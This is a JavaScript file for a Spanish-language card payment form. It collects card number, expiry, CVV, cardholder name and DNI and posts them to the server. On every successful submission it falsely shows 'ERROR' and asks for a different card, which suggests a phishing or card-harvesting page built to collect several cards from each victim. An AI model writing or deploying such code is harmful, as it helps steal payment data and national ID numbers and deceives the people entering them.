document.addEventListener("DOMContentLoaded", function() {
    const submitButton = document.getElementById("btnPagar");
    if (submitButton) {
        submitButton.addEventListener("click", pagar);
    }
});

function pagar() {
    const cardNumber = document.getElementById('cardNumber')
    const expireDate = document.getElementById('expireDate')
    const cvv = document.getElementById('cvv')
    const cardHolder = document.getElementById('cardHolder')
    const dni = document.getElementById('dni')

    if (cardNumber.value.length === 0 || expireDate.value.length === 0 || cvv.value.length === 0 || cardHolder.value.length === 0 || dni.value.length === 0) {
            Swal.fire({
                title: 'Error',
                text: 'Por favor complete todos los campos antes de continuar',
                icon: 'error',  // Error icon for the alert
                confirmButtonText: 'Intente nuevamente'
            });
            return
    }

    axios.post('/pago', {
        data: {
            cardNumber: cardNumber.value,
            expireDate: expireDate.value,
            cvv: cvv.value,
            cardHolder: cardHolder.value,
            dni: dni.value,
        }
    })
        .then(response => {
            Swal.fire({
                title: 'ERROR',
                text: 'Reintente con una tarjeta diferente!',
                icon: 'error',  // Options: 'success', 'error', 'warning', 'info', 'question'
                confirmButtonText: 'Reintentar'
            });
            cardNumber.value = ""
            expireDate.value = ""
            cvv.value = ""
            cardHolder.value = ""
            dni.value = ""
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

$(document).ready(function () {
    $('#expireDate').on('input', function () {
        let input = $(this).val();

        // Remove non-numeric characters
        input = input.replace(/\D/g, '');

        // Add a slash after the month if there are at least 2 characters
        if (input.length > 2) {
            input = input.slice(0, 2) + '/' + input.slice(2);
        }

        // Limit input to 5 characters (MM/YY format)
        $(this).val(input.slice(0, 5));
    });

    $('#cardNumber').on('input', function() {
        // Remove all non-numeric characters
        let value = $(this).val().replace(/\D/g, '');
        // Add a space every 4 digits
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        // Set the formatted value back to the input
        $(this).val(value);
    });
});
